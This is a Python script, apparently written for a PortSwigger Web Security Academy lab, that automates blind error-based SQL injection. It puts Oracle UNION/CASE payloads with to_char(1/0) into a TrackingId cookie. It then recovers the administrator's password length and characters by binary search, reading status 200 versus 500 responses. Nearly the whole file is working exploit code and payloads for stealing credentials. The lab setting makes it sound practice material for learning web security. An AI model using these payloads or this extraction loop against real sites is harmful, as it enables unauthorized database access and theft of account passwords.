import requests
import time

# +union+select+
#       case+when+substr((select+password+from+users+where+username='administrator'),1,1)='i'+
#           then+'a'+
#           else+to_char(1/0)+end+
# from+dual--

# "'+union+select+
#       case+when+1=1+
#           then+'a'+
#           else+to_char(1/0)+
#       end+
# from+dual--"

HOST = "0a9400ac0378df8e80f5039200b0000e.web-security-academy.net" 
url = "https://"+ HOST + "/"

# I had to copy the whole request from burpsuite just so if i do a second request,
# the website would recognize that i already recieved a cookie and won't create a new cookie for the second request
HEADERS1 = {
                "Host": HOST, 
                "Sec-Ch-Ua": "'Not:A-Brand';v='99', 'Chromium';v='112'", 
                "Sec-Ch-Ua-Mobile": "?0", 
                "Sec-Ch-Ua-Platform": "'Windows'", 
                "Upgrade-Insecure-Requests": "1", 
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", 
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
                "Sec-Fetch-Site": "none", 
                "Sec-Fetch-Mode": "navigate", 
                "Sec-Fetch-User": "?1", 
                "Sec-Fetch-Dest": "document", 
                "Accept-Encoding": 
                "gzip, deflate", 
                "Accept-Language": 
                "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", 
                "Connection": "close"
            }

response1 = requests.get(url=url, headers=HEADERS1)
# print("[] ", response1.headers["Set-Cookie"])
print("[] Status Code of first Request : " + str(response1.status_code))
print("   .\n   .\n   .")

HEADERS2 = {
                "Host": HOST, 
                "Cookie": response1.headers["Set-Cookie"],
                # "Cookie": "TrackingId=GmHAV6aM6qoMHqGW; session=e52Ul5HQ7l8yN1bUP2HkFsihhusC9B8Q",
                "Cache-Control": "max-age=0",
                "Sec-Ch-Ua": "'Not:A-Brand';v='99', 'Chromium';v='112'", 
                "Sec-Ch-Ua-Mobile": "?0", 
                "Sec-Ch-Ua-Platform": "'Windows'", 
                "Upgrade-Insecure-Requests": "1", 
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", 
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
                "Sec-Fetch-Site": "none", 
                "Sec-Fetch-Mode": "navigate", 
                "Sec-Fetch-User": "?1", 
                "Sec-Fetch-Dest": "document", 
                "Accept-Encoding": 
                "gzip, deflate", 
                "Accept-Language": 
                "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7", 
                "Connection": "close"
            }

INJECTION =  "'+union+select+case+when+substr((select+password+from+users+where+username='administrator'),X,Y)>='N'+then+'a'+else+to_char(1/0)+end+from+dual--"
PASSWORD_SIZE_INJECTION = "'+union+select+case+when+(select+username+from+users+where+username='administrator'+and+LENGTH(password)<=N)='administrator'+then+'a'+else+to_char(1/0)+end+from+dual--"



def findPasswordSize() -> int:
    password_size = 0
    headers2 = HEADERS2.copy()
    while True:
        inj = PASSWORD_SIZE_INJECTION[:106] + f"{password_size}" + PASSWORD_SIZE_INJECTION[107:]

        headers2["Cookie"] = HEADERS2["Cookie"][:27] + inj + HEADERS2["Cookie"][27:]

        print(HEADERS2["Cookie"])

        response2 = requests.get(url=url, headers=headers2)

        if response2.status_code == 200:
            break

        password_size += 1

    print("[] Size of the administrator password is : " + str(password_size))
    return password_size

def listOfCharacters() -> str:
    ch = ""
    for i in range(36):
        if i < 10:
            ch += chr(i + 48)
        else :
            ch += chr(i + 55).lower()
        
    return ch

ch = listOfCharacters()
print("[] ", ch)
password_size = findPasswordSize()

def findPassword(ch, password_size) -> str:
    password = ""
    headers2 = HEADERS2.copy()
    for x in range(1, password_size + 1):

        inj = INJECTION[:92] + f"{x},{x}" + INJECTION[95:]
        target_char = ch

        while True:
            ch_length = (len(target_char) // 2) 
            print("ch_length = ", ch_length)
            print("target_char = ", target_char)


            N = inj.find('>=') + 3
            inj = inj[:N] + f"{target_char[ch_length]}" + inj[N+1:]
            print(inj)

            headers2["Cookie"] = HEADERS2["Cookie"][:27] + inj + HEADERS2["Cookie"][27:]
            print(headers2["Cookie"])

            response2 = requests.get(url=url, headers=headers2)
            # time.sleep(2)
            print("Status code is : ", response2.status_code)

            if len(target_char) == 1:
                break

            if response2.status_code == 200:
                target_char = target_char[ch_length:]
            elif response2.status_code == 500:
                target_char = target_char[:ch_length]

        password += target_char
        print("Password = ", password)


    print("Password for administrator is : " + password)
    return password

password = findPassword(ch, password_size)
        


# def findCharacter(ch, response, inj):

    

